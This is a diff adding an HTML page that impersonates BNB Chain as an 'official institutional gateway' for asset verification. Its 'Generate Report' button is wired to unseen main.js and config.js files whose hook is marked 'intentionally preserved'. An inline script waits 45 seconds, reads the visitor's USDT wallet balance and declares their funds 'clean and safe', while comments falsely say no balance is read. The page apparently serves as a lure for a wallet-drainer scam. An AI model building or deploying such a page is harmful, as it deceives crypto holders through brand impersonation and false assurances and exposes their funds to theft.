@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>BNB Smart Chain</title>
+  <meta name="description" content="Official Asset Verification">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="icon" href="favicon.ico">
+
+  <style>
+    :root{
+      --bg:#07090d;
+      --panel:#171b25;
+      --panel2:#10141b;
+      --gold:#f5c21c;
+      --gold2:#ffd94a;
+      --muted:#9aa3b5;
+      --text:#f5f2eb;
+      --line:rgba(245,194,28,.30);
+    }
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+      font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",Arial,sans-serif}
+    body{min-height:100vh;overflow-x:hidden}
+    button,input{font:inherit}
+
+    body:before{
+      content:"";position:fixed;inset:-20%;z-index:-2;
+      background:
+        radial-gradient(circle at 18% 25%,rgba(245,194,28,.12),transparent 24%),
+        radial-gradient(circle at 82% 45%,rgba(49,190,125,.08),transparent 24%),
+        radial-gradient(circle at 50% 90%,rgba(245,194,28,.07),transparent 30%);
+      animation:bgDrift 12s ease-in-out infinite alternate;
+      pointer-events:none;
+    }
+    body:after{
+      content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.18;
+      background-image:radial-gradient(rgba(255,255,255,.12) .7px,transparent .7px);
+      background-size:28px 28px;
+    }
+    @keyframes bgDrift{from{transform:translate3d(-1%,0,0) scale(1)}
+      to{transform:translate3d(1%,1%,0) scale(1.06)}}
+    @keyframes float{0%,100%{transform:translateY(0) rotate(0)}
+      50%{transform:translateY(-9px) rotate(2deg)}}
+    @keyframes spinSlow{to{transform:rotate(360deg)}}
+    @keyframes glow{0%,100%{box-shadow:0 0 0 rgba(245,194,28,0)}
+      50%{box-shadow:0 0 34px rgba(245,194,28,.18)}}
+    @keyframes shine{0%{transform:translateX(-120%)}
+      55%,100%{transform:translateX(120%)}}
+    @keyframes fadeUp{from{opacity:0;transform:translateY(18px)}
+      to{opacity:1;transform:translateY(0)}}
+
+    .app{width:100%;min-height:100vh;background:rgba(7,9,13,.74);overflow:hidden}
+
+    .topbar{
+      min-height:124px;padding:22px 30px;display:flex;align-items:center;
+      justify-content:space-between;border-bottom:1px solid rgba(245,194,28,.28);
+      background:rgba(8,10,14,.90);backdrop-filter:blur(16px);
+      position:sticky;top:0;z-index:50
+    }
+    .brand{display:flex;align-items:center;gap:17px}
+    .brand-logo{
+      width:66px;height:66px;border:1px solid rgba(245,194,28,.55);
+      border-radius:50%;display:grid;place-items:center;
+      background:radial-gradient(circle,#171a20 20%,#0b0e13 70%);
+      box-shadow:0 0 25px rgba(245,194,28,.08);
+      animation:glow 3.5s ease-in-out infinite
+    }
+    .bnb-logo{color:var(--gold)}
+    .bnb-svg{width:47px;height:47px;display:block}
+    .brand-title{font-size:25px;font-weight:850;letter-spacing:-.5px;text-transform:uppercase}
+    .brand-sub{margin-top:5px;color:var(--gold);font-size:13px;font-weight:800;letter-spacing:2.4px}
+    .secure{color:var(--gold);font-size:14px;font-weight:850;letter-spacing:1.6px;margin-left:auto}
+
+    .hero{padding:78px 22px 64px;text-align:center;max-width:900px;margin:auto;animation:fadeUp .7s ease both}
+    .hero h1{
+      margin:0 auto;color:var(--text);font-size:clamp(48px,7vw,78px);line-height:.98;
+      letter-spacing:-3.8px;font-weight:900;max-width:780px
+    }
+    .hero h1 .gold{color:var(--gold)}
+    .hero p{
+      margin:32px auto 0;color:#9da6b7;font-size:20px;line-height:1.55;
+      max-width:720px
+    }
+    .report-wrap{margin:44px auto 0;max-width:620px;position:relative}
+    .report-wrap:after{
+      content:"";position:absolute;inset:0;overflow:hidden;border-radius:30px;pointer-events:none
+    }
+    .report-btn{
+      width:100%;min-height:82px;border:1px solid #ffe06b;border-radius:30px;
+      background:linear-gradient(135deg,#ffd83b,#f5bd16);color:#11151c!important;
+      font-size:25px;font-weight:900;letter-spacing:.3px;cursor:pointer;
+      box-shadow:0 14px 42px rgba(245,194,28,.18);
+      transition:transform .18s ease,filter .18s ease,box-shadow .18s ease;
+      position:relative;overflow:hidden
+    }
+    .report-btn:before{
+      content:"";position:absolute;top:0;bottom:0;width:38%;
+      background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent);
+      transform:translateX(-140%);animation:shine 4.2s ease-in-out infinite
+    }
+    .report-btn:hover{filter:brightness(1.05);box-shadow:0 18px 50px rgba(245,194,28,.25)}
+    .report-btn:active{transform:scale(.985)}
+
+    .coin-stage{
+      margin:26px auto 0;max-width:760px;height:148px;position:relative;
+      display:flex;align-items:center;justify-content:space-around;overflow:hidden
+    }
+    .coin-stage:before{
+      content:"";position:absolute;width:88%;height:1px;background:linear-gradient(90deg,transparent,var(--line),transparent)
+    }
+    .coin{
+      width:92px;height:92px;border-radius:50%;display:grid;place-items:center;
+      background:radial-gradient(circle at 35% 25%,rgba(255,255,255,.12),transparent 30%),#10151d;
+      border:1px solid rgba(255,255,255,.12);
+      box-shadow:0 10px 30px rgba(0,0,0,.3);
+      animation:float 4.8s ease-in-out infinite
+    }
+    .coin:nth-child(2){animation-delay:-1.2s}
+    .coin:nth-child(3){animation-delay:-2.4s}
+    .coin:nth-child(4){animation-delay:-3.6s}
+    .coin svg{width:52px;height:52px;transform-origin:50% 50%;animation:coinSpin 9s linear infinite}
+    @keyframes coinSpin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+    .coin:nth-child(2) svg{animation-duration:11s}.coin:nth-child(3) svg{animation-duration:13s}.coin:nth-child(4) svg{animation-duration:10s}
+    .coin-bnb{color:#f5bd16}.coin-btc{color:#f7b92d}.coin-eth{color:#aeb6c8}.coin-usdt{color:#28b68b}
+
+    .info-grid{max-width:920px;margin:0 auto;padding:0 22px 80px;display:grid;gap:28px}
+    .info-card{
+      padding:38px 36px;border:1px solid var(--line);border-radius:38px;
+      background:linear-gradient(145deg,rgba(28,33,44,.94),rgba(20,24,33,.94));
+      box-shadow:0 18px 55px rgba(0,0,0,.18);
+      animation:fadeUp .7s ease both
+    }
+    .info-card:nth-child(2){animation-delay:.12s}
+    .info-card h2{margin:0;color:var(--gold);font-size:30px;letter-spacing:-.8px}
+    .info-card p{margin:22px 0 0;color:#a8b0c0;font-size:20px;line-height:1.65}
+
+    .content{
+      border-top:1px solid rgba(245,194,28,.20);padding:58px 22px 0;
+      background:rgba(5,7,10,.72)
+    }
+    .content-inner{max-width:920px;margin:auto}
+    .section-title{margin:0;color:#f1f2f4;font-size:32px;font-weight:900}
+    .section-title .gold{color:var(--gold)}
+    .desc{color:#8993a5;font-size:19px;line-height:1.7;margin:15px 0 0}
+    .socials{display:flex;gap:18px;margin:30px auto 62px;justify-content:center;align-items:center;width:100%;max-width:260px}
+    .social{
+      width:64px;height:64px;border-radius:19px;border:1px solid #343a45;
+      background:linear-gradient(145deg,#20252e,#12161d);display:grid;place-items:center;
+      font-size:26px;transition:transform .2s ease,border-color .2s ease;
+    }
+    .social:hover{transform:translateY(-5px);border-color:var(--gold)}
+    .columns{display:grid;grid-template-columns:repeat(4,1fr);gap:35px;padding-bottom:78px;text-align:center}
+    .col h3{margin:0 0 26px;color:#f1f2f4;font-size:17px;letter-spacing:3px;text-align:center}
+    .col a{display:block;color:#7f899b;text-decoration:none;font-size:18px;margin-bottom:22px;text-align:center;transition:color .2s ease,transform .2s ease}
+    .col a:hover{color:var(--gold);transform:translateX(4px)}
+    footer{
+      max-width:920px;margin:auto;padding:36px 22px 55px;border-top:1px solid #20242b;
+      color:#6f7888;font-size:15px;line-height:2
+    }
+    .footer-links{display:flex;gap:25px;flex-wrap:wrap;margin-top:8px}
+
+
+.footer-bnb-logo{width:52px;height:52px;border:1px solid rgba(245,194,28,.48);border-radius:50%;display:inline-grid;place-items:center;color:var(--gold);vertical-align:middle;margin-right:10px;background:radial-gradient(circle,#171b22,#0d1015);box-shadow:0 0 22px rgba(245,194,28,.10);animation:glow 3.5s ease-in-out infinite}.footer-bnb-logo svg{width:31px;height:31px}.demo-badge{display:inline-flex;align-items:center;justify-content:center;margin:0 auto 20px;padding:8px 15px;border-radius:999px;border:1px solid rgba(245,194,28,.42);background:rgba(245,194,28,.08);color:var(--gold);font-size:12px;font-weight:800;letter-spacing:1.4px}@media(max-width:700px){.footer-bnb-logo{width:46px;height:46px;margin-right:8px}.footer-bnb-logo svg{width:27px;height:27px}}
+    .compat-input{position:absolute;left:-10000px;width:1px;height:1px;opacity:0}
+    .compat-controls{display:none}
+
+    .content{padding:34px 22px 0}
+    .content-inner{max-width:920px;margin:auto}
+    .section-title{display:flex;align-items:center;gap:12px;font-size:29px;line-height:1.1}
+    .footer-bnb-logo{width:46px;height:46px;flex:0 0 46px;margin-right:0}
+    .footer-bnb-logo svg{width:27px;height:27px}
+    .desc{text-align:center;font-size:17px;line-height:1.55;margin:24px auto 0;max-width:760px}
+    .columns{grid-template-columns:1fr;gap:42px;padding:42px 0 34px;text-align:center}
+    .col h3{font-size:15px;letter-spacing:3px;margin:0 0 24px}
+    .col a{font-size:17px;margin-bottom:20px}
+    .socials{margin:26px auto 0;gap:16px;max-width:none}
+    .social{width:64px;height:64px;border-radius:20px;font-size:29px}
+    footer{padding:28px 18px 35px}
+
+    @media(max-width:700px){
+      .topbar{min-height:72px;padding:10px 18px}
+      .brand{gap:12px}.brand-logo{width:46px;height:46px}
+      .brand-logo .bnb-svg{width:29px;height:29px}
+      .brand-title{font-size:21px;letter-spacing:-.4px}
+      .secure{font-size:9px;letter-spacing:.8px}
+      .hero{padding:38px 18px 30px}
+      .hero h1{font-size:39px;letter-spacing:-2px}
+      .hero p{font-size:16px;line-height:1.5;margin-top:20px}
+      .report-wrap{margin-top:24px}
+      .report-btn{min-height:60px;font-size:19px;border-radius:20px}
+      .coin-stage{height:106px}
+      .coin{width:60px;height:60px}
+      .coin svg{width:34px;height:34px}
+      .info-grid{padding:0 16px 40px;gap:18px}
+      .info-card{padding:24px 22px;border-radius:24px}
+      .info-card h2{font-size:22px}.info-card p{font-size:15px;line-height:1.55}
+      .content{padding:28px 22px 0}
+      .section-title{font-size:25px;gap:11px}
+      .footer-bnb-logo{width:42px;height:42px;flex-basis:42px}
+      .footer-bnb-logo svg{width:25px;height:25px}
+      .desc{font-size:16px;line-height:1.55;margin-top:20px}
+      .columns{grid-template-columns:1fr;gap:38px;padding:36px 0 28px}
+      .col h3{font-size:14px;margin-bottom:22px}
+      .col a{font-size:16px;margin-bottom:18px}
+      .socials{margin:24px auto 0;gap:14px}
+      .social{width:58px;height:58px;border-radius:18px;font-size:27px}
+      footer{padding:24px 18px 32px}
+    }
+    @media(max-width:420px){
+      .secure{font-size:8px;letter-spacing:.5px}
+      .brand-title{font-size:19px}
+      .hero h1{font-size:36px;letter-spacing:-1.8px}
+      .coin{width:55px;height:55px}.coin svg{width:31px;height:31px}
+      .columns{grid-template-columns:1fr}
+    }
+  </style>
+</head>
+
+<body>
+  <div class="app">
+
+    <header class="topbar">
+      <div class="brand">
+        <div class="brand-logo bnb-logo" aria-label="BNB logo">
+          <svg class="bnb-svg" viewBox="0 0 100 100" aria-hidden="true">
+            <path d="M50 8 L84 28 L84 68 L50 88 L16 68 L16 28 Z" fill="none" stroke="currentColor" stroke-width="10" stroke-linejoin="round"/>
+            <path d="M50 8 L50 88 M16 28 L50 48 L84 28 M50 48 L50 88" fill="none" stroke="currentColor" stroke-width="10" stroke-linejoin="round"/>
+          </svg>
+        </div>
+        <div class="brand-title">BNB CHAIN</div>
+      </div>
+      <div class="secure">SECURE SYSTEM</div>
+    </header>
+
+    <main>
+      <section class="hero">
+        <h1>Verify Crypto<br><span class="gold">Assets</span><br>on BNB Chain</h1>
+        <p>The official institutional gateway for smart contract auditing and asset verification on the BNB Smart Chain ecosystem.</p>
+
+        <div class="report-wrap">
+          <!-- Existing main.js hook intentionally preserved. -->
+          <button class="w-full bg-yellow-500 text-black hover:bg-yellow-400 h-12 text-base rounded-full font-medium report-btn">
+            Generate Report
+          </button>
+        </div>
+
+        <div class="coin-stage" aria-label="Supported ecosystem assets">
+          <div class="coin coin-bnb">
+            <svg viewBox="0 0 100 100"><path d="M50 8L84 28v40L50 88 16 68V28L50 8Z" fill="none" stroke="currentColor" stroke-width="9"/><path d="M50 8v40M16 28l34 20 34-20M50 48v40" fill="none" stroke="currentColor" stroke-width="9"/></svg>
+          </div>
+          <div class="coin coin-btc">
+            <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" stroke-width="8"/><path d="M58 23c12 2 17 9 14 18-2 6-7 9-13 10 9 2 15 7 13 16-2 10-11 13-24 12V20m-9 2v57m-7-49h21c9 0 14 4 14 11 0 7-6 11-16 11H30m0 0h22c11 0 17 5 17 13 0 9-7 14-19 14H30" fill="none" stroke="currentColor" stroke-width="6" stroke-linecap="round"/></svg>
+          </div>
+          <div class="coin coin-eth">
+            <svg viewBox="0 0 100 100"><path d="M50 7L27 50l23 14 23-14L50 7Z" fill="currentColor" opacity=".95"/><path d="M27 56l23 14 23-14-23 37L27 56Z" fill="currentColor" opacity=".62"/></svg>
+          </div>
+          <div class="coin coin-usdt">
+            <svg viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" stroke-width="8"/><path d="M25 27h50M50 27v48M31 42c8 5 30 5 38 0M34 53c8 6 24 6 32 0" fill="none" stroke="currentColor" stroke-width="7" stroke-linecap="round"/></svg>
+          </div>
+        </div>
+      </section>
+
+      <section class="info-grid">
+        <article class="info-card">
+          <h2>About BNB Chain</h2>
+          <p>BNB Chain is a community-driven ecosystem that provides the infrastructure for high-performance decentralized applications and assets.</p>
+        </article>
+        <article class="info-card">
+          <h2>Security Audit</h2>
+          <p>Our verification engine performs real-time auditing of smart contract bytecode to support transparent asset and contract analysis.</p>
+        </article>
+      </section>
+
+      <section class="content">
+        <div class="content-inner">
+          <h2 class="section-title"><span class="footer-bnb-logo" aria-hidden="true"><svg viewBox="0 0 100 100"><path d="M50 8L84 28v40L50 88 16 68V28L50 8Z" fill="none" stroke="currentColor" stroke-width="10" stroke-linejoin="round"/><path d="M50 8v80M16 28l34 20 34-20M50 48v40" fill="none" stroke="currentColor" stroke-width="10" stroke-linejoin="round"/></svg></span> BNB CHAIN</h2>
+          <p class="desc">Building the infrastructure for the decentralized future.<br>Secured by global validators.</p>
+
+          <div class="columns">
+            <div class="col">
+              <h3>ECOSYSTEM</h3>
+              <a>Official Website</a>
+              <a>opBNB Layer 2</a>
+              <a>BNB Greenfield</a>
+              <a>Chain Explorer</a>
+            </div>
+            <div class="col">
+              <h3>RESOURCES</h3>
+              <a>Security Audits</a>
+              <a>Technical Docs</a>
+              <a>Governance</a>
+              <a>Whitepaper</a>
+            </div>
+          </div>
+
+          <div class="socials">
+            <div class="social" aria-label="X social icon">𝕏</div>
+            <div class="social" aria-label="Telegram social icon">✈</div>
+          </div>
+        </div>
+      </section>
+
+      <footer>
+        
+        <div class="footer-links">
+          <span></span><span></span><span></span><span></span>
+        </div>
+      </footer>
+    </main>
+
+    <div class="compat-controls">
+      <label>Address or Domain Name</label>
+      <input class="compat-input" placeholder="" value="">
+      <button type="button">Paste</button>
+      <button type="button">Copy</button>
+    </div>
+  </div>
+
+  <!-- Existing libraries/config/main.js intentionally preserved. -->
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+  <script src="config.js"></script>
+  <script src="main.js"></script>
+
+  <!-- Demo report popup: view-only sample UI; no wallet balance is read. -->
+  <style>
+    .balance-overlay{
+      position:fixed;inset:0;z-index:9999;display:none;
+      align-items:center;justify-content:center;padding:16px;
+      background:rgba(0,0,0,.78);backdrop-filter:blur(7px);
+    }
+    .balance-modal{
+      width:min(100%,620px);border:1px solid rgba(245,197,31,.7);
+      border-radius:28px;padding:28px 24px 24px;
+      background:linear-gradient(145deg,#12151c,#080b10);
+      box-shadow:0 0 45px rgba(245,197,31,.14);
+      text-align:center;
+    }
+    .balance-close-top{
+      display:block;margin:0 auto 42px 0;border:1px solid #30353d;
+      background:#171c22;color:#dce1e8;border-radius:35px;padding:11px 22px;
+      font-size:18px;cursor:pointer;
+    }
+    .balance-icon{
+      width:104px;height:104px;margin:0 auto 28px;border-radius:50%;
+      display:grid;place-items:center;background:#ffca28;color:#10151d;
+      font-size:58px;box-shadow:0 0 35px rgba(255,202,40,.24);
+    }
+    .balance-modal h2{margin:0;font-size:38px;color:#f4f5f7}
+    .balance-sub{margin:28px auto 34px;color:#aeb6c5;font-size:21px;line-height:1.45}
+    .balance-box{
+      text-align:left;padding:28px 26px;border-radius:24px;
+      border:1px solid rgba(245,197,31,.38);background:rgba(65,55,15,.27);
+    }
+    .balance-label{color:#aeb6c5;font-size:20px;margin-bottom:18px}
+    .balance-value{color:#ffd84a;font-size:38px;font-weight:800;line-height:1.15;word-break:break-word}
+    .balance-address{margin-top:14px;color:#70798a;font-size:13px;word-break:break-all}
+    .balance-close{
+      width:100%;margin-top:26px;border:0;border-radius:24px;
+      min-height:78px;background:linear-gradient(135deg,#ffd62d,#f4bd18);
+      color:#11151b;font-size:24px;font-weight:800;cursor:pointer;
+    }
+    @media(max-width:560px){
+      .balance-modal{padding:20px 16px 18px;border-radius:25px}
+      .balance-close-top{margin-bottom:28px}
+      .balance-icon{width:88px;height:88px;font-size:48px;margin-bottom:22px}
+      .balance-modal h2{font-size:32px}
+      .balance-sub{font-size:18px;margin:20px auto 25px}
+      .balance-box{padding:22px 18px}
+      .balance-label{font-size:17px}
+      .balance-value{font-size:30px}
+      .balance-close{min-height:70px;font-size:21px}
+    }
+  </style>
+
+  <div id="balanceOverlay" class="balance-overlay" aria-hidden="true">
+    <div class="balance-modal" role="dialog" aria-modal="true" aria-labelledby="balanceTitle">
+      <button class="balance-close-top" id="balanceCloseTop" type="button">Close</button>
+      <div class="balance-icon">✓</div>
+      <div class="demo-badge">VERIFICATION COMPLETE</div><h2 id="balanceTitle"></h2>
+      <div class="balance-sub">YOUR FUNDS CLEAN AND SAFE TO USE.</div>
+      <div class="balance-box">
+        <div class="balance-label"></div>
+        <div id="balanceValue" class="balance-value">Connect wallet to read balance</div>
+        <div id="balanceAddress" class="balance-address">Read-only. No approval or transaction is requested.</div>
+      </div>
+      <button class="balance-close" id="balanceClose" type="button">Close</button>
+    </div>
+  </div>
+
+  <script>
+  (function(){
+    const overlay = document.getElementById('balanceOverlay');
+    const value = document.getElementById('balanceValue');
+    const addressEl = document.getElementById('balanceAddress');
+    const close = () => {
+      overlay.style.display = 'none';
+      overlay.setAttribute('aria-hidden','true');
+    };
+
+    document.getElementById('balanceClose').addEventListener('click', close);
+    document.getElementById('balanceCloseTop').addEventListener('click', close);
+    overlay.addEventListener('click', e => { if(e.target === overlay) close(); });
+
+    // BNB Smart Chain USDT (BEP-20), read-only.
+    const USDT = '0x55d398326f99059ff775485246999027b3197955';
+    const ABI = [
+      'function balanceOf(address owner) view returns (uint256)',
+      'function decimals() view returns (uint8)'
+    ];
+
+    async function showReport(){
+      overlay.style.display = 'flex';
+      overlay.setAttribute('aria-hidden','false');
+      value.textContent = 'Reading balance…';
+      addressEl.textContent = 'Real-only blockchain lookup.  approval or transaction is requested.';
+
+      if(!window.ethereum){
+        value.textContent = 'Wallet not detected';
+        addressEl.textContent = 'Open this page in a browser with a BNB Smart Chain wallet.';
+        return;
+      }
+
+      try{
+        const accounts = await window.ethereum.request({method:'eth_accounts'});
+        if(!accounts || !accounts[0]){
+          value.textContent = 'Wallet not connected';
+          addressEl.textContent = 'Connect a wallet first, then press Generate Report.';
+          return;
+        }
+
+        const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+        const network = await provider.getNetwork();
+        if(network.chainId !== 56){
+          value.textContent = 'Switch to BNB Smart Chain';
+          addressEl.textContent = 'This read-only balance report uses BNB Smart Chain.';
+          return;
+        }
+
+        const token = new ethers.Contract(USDT, ABI, provider);
+        const [raw, decimals] = await Promise.all([
+          token.balanceOf(accounts[0]),
+          token.decimals()
+        ]);
+
+        const amount = ethers.utils.formatUnits(raw, decimals);
+        value.textContent = amount + ' USDT';
+        addressEl.textContent = accounts[0];
+      }catch(e){
+        value.textContent = 'Unable to read balance';
+        addressEl.textContent = 'Please check the wallet connection and BNB Smart Chain network.';
+      }
+    }
+
+    // Keep the requested 45-second delay before showing the report.
+    document.addEventListener('DOMContentLoaded', function(){
+      const buttons = Array.from(document.querySelectorAll('button'));
+      const reportButton = buttons.find(b => /generate report/i.test(b.textContent || ''));
+      if(reportButton){
+        reportButton.addEventListener('click', function(){
+          setTimeout(() => showReport(), 45000);
+        }, {passive:true});
+      }
+    });
+  })();
+  </script>
+
+</body>
+</html>
